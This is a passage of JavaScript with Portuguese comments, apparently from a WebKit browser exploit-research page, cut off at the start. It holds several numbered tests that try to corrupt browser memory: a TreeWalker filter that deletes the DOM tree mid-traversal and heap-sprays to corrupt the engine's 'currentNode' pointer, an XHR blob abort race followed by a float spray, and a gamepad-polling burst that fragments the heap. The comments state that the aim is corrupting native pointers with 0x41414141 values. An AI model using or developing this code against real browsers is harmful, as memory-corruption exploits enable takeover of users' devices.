        // O Spray Elegante: Baseado na sua POC, injeta 0x4141414141414141 usando floats

            let spray = [];

                raiz.appendChild(filho);
                container.appendChild(raiz);

                // O C++ chama esta funçăo nativamente a cada passo da travessia
                let filtroNatividade = {
                    acceptNode: function(node) {
                        if (node.tagName === 'SPAN') {
                            // A meio da travessia C++, nós aniquilamos a árvore inteira
                            raiz.remove();
                            // Pulverizamos para tentar corromper o ponteiro interno 'currentNode' do WebKit
                            window.sprayWalker = heapSpray();
                            return NodeFilter.FILTER_ACCEPT;
                        }
                        return NodeFilter.FILTER_SKIP;
                    }
                };

                let walker = document.createTreeWalker(raiz, NodeFilter.SHOW_ELEMENT, filtroNatividade, false);

                // Esta chamada desce para o C++, que entăo invoca o nosso filtro de volta
                walker.nextNode();
                
                logOutput("[Teste 158] Filtro TreeWalker C++ corrompido com sucesso durante a iteraçăo.");

        // ==========================================
        // Teste 203: XHR Blob Abort Race Condition
        // ==========================================
        function runTest203() {
            clearOutput();
            logOutput("[Teste 203] A iniciar corrida de I/O na Thread de Rede (XHR)...");
            
            try {
                // Cria um Blob gigante para forçar tempo de leitura
                let payload = new Uint8Array(10 * 1024 * 1024); // 10MB
                let blob = new Blob([payload], {type: "application/octet-stream"});
                let url = URL.createObjectURL(blob);
                
                let xhr = new XMLHttpRequest();
                xhr.open("GET", url, true);
                
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 2) { // HEADERS_RECEIVED
                        try {
                            // A thread nativa vai começar a escrever o payload no corpo da resposta
                            // Nós cortamos a conexăo abruptamente e revogamos a memória partilhada
                            xhr.abort();
                            URL.revokeObjectURL(url);
                            
                            // Removemos a referęncia ao XHR e pulverizamos o espaço
                            xhr = null;
                            window.spray203 = elegantFloatSpray(3);
                            
                            logOutput("Conexăo XHR abortada a meio do trânsito interno. Memória pulverizada.");
                        } catch(err) {}
                    }
                };
                
                xhr.send();
            } catch(e) {
                logOutput("Falha estrutural na API XHR: " + e);
            }
        }

        // ==========================================
        // Teste 210: 60FPS Polling Burst + Mathematical Spray
        // ==========================================
        function runTest210() {
            clearOutput();
            logOutput("[Teste 210] A iniciar 30 frames de pressăo de Polling IPC + Spray...");
            
            let frames = 0;
            const LIMIT = 30; // Controlado para năo causar DoS, mas suficiente para causar colisăo no IPC
            window.spray210 = [];

            function loop() {
                try {
                    // Lę o hardware nativamente a cada frame (gera mensagem IPC interna)
                    let pads = navigator.getGamepads();
                    
                    // Aloca lixo matemático e guarda na memória global para fragmentar o Heap nativamente
                    window.spray210.push(elegantFloatSpray(1));
                    
                    frames++;
                    
                    if (frames < LIMIT) {
                        requestAnimationFrame(loop);
                    } else {
                        logOutput("Pressăo de frames terminada. Se a consola năo engasgou, o Garbage Collector limpou o IPC a tempo.");
                        // Liberta a RAM passados uns segundos para manter o ambiente limpo
                        setTimeout(() => { window.spray210 = []; }, 1000);
                    }
                } catch(e) {
                    logOutput("Erro no FrameLoop: " + e);
                }
            }
            
            requestAnimationFrame(loop);
        }
